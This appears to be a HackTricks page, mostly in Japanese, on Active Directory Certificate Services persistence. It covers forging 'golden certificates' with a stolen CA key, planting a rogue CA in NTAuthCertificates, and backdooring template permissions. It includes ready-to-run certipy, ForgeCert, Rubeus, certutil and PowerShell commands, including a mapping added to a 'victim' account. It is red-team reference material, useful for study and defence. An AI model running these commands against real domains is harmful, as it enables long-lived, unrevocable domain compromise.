# AD CS ドメイン永続化

{{#include ../../../banners/hacktricks-training.md}}

**これは [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) で共有されているドメイン永続化手法の要約です**. 詳細はそちらを確認してください。

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

証明書が CA 証明書であるとどう判断しますか？

以下の条件がいくつか満たされていれば、その証明書は CA 証明書であると判断できます：

- 証明書は CA サーバー上に保存され、その秘密鍵はマシンの DPAPI によって保護されているか、OS がサポートしていれば TPM/HSM 等のハードウェアで保護されている。
- 証明書の Issuer と Subject フィールドの両方が CA の distinguished name と一致する。
- 「CA Version」拡張が CA 証明書にのみ存在する。
- 証明書に Extended Key Usage (EKU) フィールドがない。

この証明書の秘密鍵を抽出するには、CA サーバー上の `certsrv.msc` ツールを使うのが組み込み GUI 経由でサポートされている方法です。とはいえ、この証明書はシステム内に保存されている他の証明書と異なるものではないため、[THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) のような方法で抽出することも可能です。

証明書と秘密鍵は、Certipy を使用して次のコマンドでも取得できます：
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
.pfx形式でCA証明書とその秘密鍵を取得したら、[ForgeCert](https://github.com/GhostPack/ForgeCert)のようなツールを使って有効な証明書を生成できます:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> 証明書偽造の対象となるユーザーは、プロセスを成功させるために Active Directory 上でアクティブかつ認証可能でなければなりません。krbtgt のような特別なアカウントに対する証明書の偽造は効果がありません。

この偽造証明書は、指定された終了日まで、そして**root CA certificate が有効である限り**（通常は5年から**10+ years**）**有効**です。これは**machines**にも有効であるため、**S4U2Self**と組み合わせることで、攻撃者は**任意のドメインマシン上で永続化を維持することができます**（CA certificate が有効な限り）。\
さらに、**この手法で生成された証明書**は、CA がそれらを認識していないため**取り消すことはできません**。

### 強力な証明書マッピングの強制下での運用 (2025+)

2025年2月11日以降（KB5014754 の展開後）、domain controllers は証明書マッピングに対してデフォルトで **Full Enforcement** になります。実務的には、偽造証明書は次のいずれかを満たす必要があります:

- ターゲットアカウントに対する強力なバインディングを含む（例：SID security extension）、または
- ターゲットオブジェクトの `altSecurityIdentities` 属性に対して強力で明示的なマッピングが設定されている

永続化の信頼できる方法は、盗まれた Enterprise CA に連鎖する偽造証明書を発行し、被害者のプリンシパルに強力な明示的マッピングを追加することです:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notes
- If you can craft forged certificates that include the SID security extension, those will map implicitly even under Full Enforcement. Otherwise, prefer explicit strong mappings. See
[account-persistence](account-persistence.md) for more on explicit mappings.
- Revocation does not help defenders here: forged certificates are unknown to the CA database and thus cannot be revoked.

## Trusting Rogue CA Certificates - DPERSIST2

The `NTAuthCertificates` object is defined to contain one or more **CA certificates** within its `cacertificate` attribute, which Active Directory (AD) utilizes. The verification process by the **domain controller** involves checking the `NTAuthCertificates` object for an entry matching the **CA specified** in the Issuer field of the authenticating **certificate**. Authentication proceeds if a match is found.

A self-signed CA certificate can be added to the `NTAuthCertificates` object by an attacker, provided they have control over this AD object. Normally, only members of the **Enterprise Admin** group, along with **Domain Admins** or **Administrators** in the **forest root’s domain**, are granted permission to modify this object. They can edit the `NTAuthCertificates` object using `certutil.exe` with the command `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, or by employing the [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
この機能は、ForgeCert を用いて証明書を動的に生成する前述の手法と組み合わせて使用する場合に特に関連性があります。

> Post-2025 のマッピングに関する注意点: NTAuth に不正な CA を配置しても発行 CA に対する信頼が確立されるだけです。DC が **Full Enforcement** の状態でリーフ証明書をログオンに使用するには、リーフに SID security extension が含まれているか、対象オブジェクト上に強力な明示的マッピング（例えば `altSecurityIdentities` における Issuer+Serial）が存在する必要があります。参照: {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

**AD CS** コンポーネントの **security descriptor** を変更することで得られる **persistence** の機会は数多く存在します。"[Domain Escalation](domain-escalation.md)" セクションで説明した変更は、ドメイン内で権限を持つ攻撃者によって悪意を持って実装され得ます。これには、次のような機密コンポーネントへの「control rights」（例: WriteOwner/WriteDACL/etc.）の付与が含まれます:

- **CA server’s AD computer** オブジェクト
- **CA server’s RPC/DCOM server**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** 内の任意の **子孫 AD オブジェクトまたはコンテナ**（例: Certificate Templates コンテナ、Certification Authorities コンテナ、NTAuthCertificates オブジェクトなど）
- デフォルトまたは組織によって **AD CS の制御権が委任された AD グループ**（built-in Cert Publishers グループやそのメンバーなど）

悪意のある実装の例としては、ドメイン内で **昇格された権限** を持つ攻撃者が、既定の `User` certificate template に対して自分を主体とする **`WriteOwner`** 権限を追加することが挙げられます。これを悪用するために、攻撃者はまず `User` テンプレートの所有権を自分に変更します。続いてテンプレート上で **`mspki-certificate-name-flag`** を **1** に設定して **`ENROLLEE_SUPPLIES_SUBJECT`** を有効化し、リクエストで Subject Alternative Name を指定可能にします。その後、攻撃者はその **template** を使用して登録（enroll）し、代替名として **domain administrator** の名前を選択して取得した証明書を DA としての認証に利用できます。

長期的なドメイン persistence を目的として攻撃者が設定し得る実務的な設定例（検出と完全な詳細は {{#ref}}domain-escalation.md{{#endref}} を参照）:

- リクエスタからの SAN を許可する CA ポリシーフラグ（例: `EDITF_ATTRIBUTESUBJECTALTNAME2` の有効化）。これにより ESC1 のような経路が利用可能なままとなります。
- 認証可能な発行を許すテンプレートの DACL や設定（例: Client Authentication EKU を追加、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` を有効化）。
- 防御側がクリーンアップを試みた場合に不正な発行者を継続的に再導入するための `NTAuthCertificates` オブジェクトや CA コンテナの制御。

> [!TIP]
> KB5014754 適用後のハードニング環境では、これらの誤設定を明示的な強力なマッピング（`altSecurityIdentities`）と組み合わせることで、DC が強いマッピングを強制している場合でも発行または偽造した証明書が使用可能なままになることを保証できます。



## References

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
